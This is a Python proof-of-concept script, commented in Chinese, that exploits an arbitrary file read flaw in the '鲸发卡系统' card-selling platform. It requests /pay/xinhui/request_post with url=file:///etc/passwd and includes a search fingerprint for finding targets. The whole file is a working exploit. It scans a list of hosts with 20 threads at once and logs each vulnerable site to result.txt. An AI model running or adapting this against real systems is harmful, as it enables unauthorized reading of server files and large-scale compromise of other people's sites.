#鲸发卡系统 payxinhuirequest_post 任意文件读取漏洞
#body="/static/theme/maowang51/css/style.css"
import requests
import sys
import argparse
import logging
from multiprocessing.dummy import Pool
from requests.exceptions import RequestException, Timeout

requests.packages.urllib3.disable_warnings()

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger()

DEFAULT_PAYLOAD = '/pay/xinhui/request_post?url=file:///etc/passwd&post_data[1]'

def main():
    parser = argparse.ArgumentParser(description="")
    parser.add_argument('-u', '--url', dest='url', type=str, help='请输入目标URL进行测试')
    parser.add_argument('-f', '--file', dest='file', type=str, help='请输入包含URL的文件路径进行批量测试')
    parser.add_argument('-p', '--payload', dest='payload', type=str, default=DEFAULT_PAYLOAD, help='自定义Payload (默认: /pay/xinhui/request_post?url=file:///etc/passwd&post_data[1])')
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url, args.payload)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as f:
            url_list = [line.strip() for line in f.readlines()]
        
        pool = Pool(20)
        pool.map(lambda url: poc(url, args.payload), url_list)
        pool.close()
        pool.join()
    else:
        logger.error("请提供一个URL或一个URL列表文件进行测试。")

def poc(target, payload):
    headers = {
        'Sec-Ch-Ua-Mobile': '?0',
        'Sec-Ch-Ua-Platform': '"Windows"',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-User': '?1',
        'Sec-Fetch-Dest': 'document',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Priority': 'u=0, i',
    }
    proxies = {
    'http':'http://127.0.0.1:7890',
    'https':'http://127.0.0.1:7890',
     }

    try:
        ses = requests.Session()
        url = target + payload
        logger.info(f"正在测试: {url}")

        res = ses.get(url, headers=headers, verify=False, timeout=5, proxies=proxies)
        
        if res.status_code == 200 and 'root' in res.text:
            logger.info(f"目标 {target} 存在漏洞，已记录。")
            with open('result.txt', 'a', encoding='utf-8') as fp:
                fp.write(target + '\n')

    except Timeout:
        logger.warning(f"请求超时: {target}")
    except RequestException as e:
        logger.error(f"请求错误 {target}: {e}")
    except Exception as e:
        logger.error(f"发生未知错误 {target}: {e}")

if __name__ == '__main__':
    main()
